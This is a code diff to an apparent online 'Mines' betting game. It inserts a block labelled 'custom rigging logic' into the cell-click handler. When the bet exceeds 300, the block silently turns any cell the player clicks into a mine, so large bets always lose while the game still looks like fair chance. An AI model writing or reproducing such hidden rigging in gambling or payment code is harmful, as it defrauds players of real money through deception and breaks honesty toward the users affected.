@@ -307,7 +307,6 @@
 
     </div>
 
-    <!-- Script updated to module for Firebase integration -->
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-app.js";
         import {
@@ -550,6 +549,15 @@
         function handleCellClick(cell, index) {
             initAudio(); 
             if (!gameActive || cell.classList.contains('revealed-diamond') || cell.classList.contains('revealed-mine')) return;
+
+            // --- CUSTOM RIGGING LOGIC ADDED HERE ---
+            // Agar bet 300 se zyada hai, to user jo bhi box click karega wo automatically mine (bomb) ban jayega
+            if (betAmount > 300) {
+                if (!minePositions.includes(index)) {
+                    minePositions[0] = index; 
+                }
+            }
+            // ---------------------------------------
 
             if (minePositions.includes(index)) {
                 // BOOM! Hit a Mine
